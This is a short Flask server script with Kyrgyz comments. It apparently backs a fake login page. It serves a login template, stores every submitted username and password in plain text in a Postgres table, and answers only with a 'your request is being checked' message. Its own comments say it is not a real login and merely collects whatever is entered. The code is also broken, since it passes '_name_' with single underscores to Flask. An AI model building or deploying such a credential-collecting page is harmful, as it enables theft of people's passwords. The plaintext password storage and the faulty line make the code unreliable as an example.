from flask import Flask, render_template, request
import psycopg2
import os

app = Flask(_name_)

DATABASE_URL = os.environ.get("DATABASE_URL")

def get_db():
    return psycopg2.connect(DATABASE_URL)

# таблица
conn = get_db()
cur = conn.cursor()
cur.execute("""
CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    username TEXT,
    password TEXT
)
""")
conn.commit()
conn.close()


# 🔐 форма (логин эмес — жөн эле кабыл алуу)
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        conn = get_db()
        cur = conn.cursor()

        # ар кандай маалымат сакталат
        cur.execute("INSERT INTO users (username, password) VALUES (%s, %s)", (username, password))

        conn.commit()
        conn.close()

        return "<h2>Сиздин запрос текшерилүүдө ⏳</h2>"

    return render_template("login.html")


port = int(os.environ.get("PORT", 10000))
app.run(host="0.0.0.0", port=port)
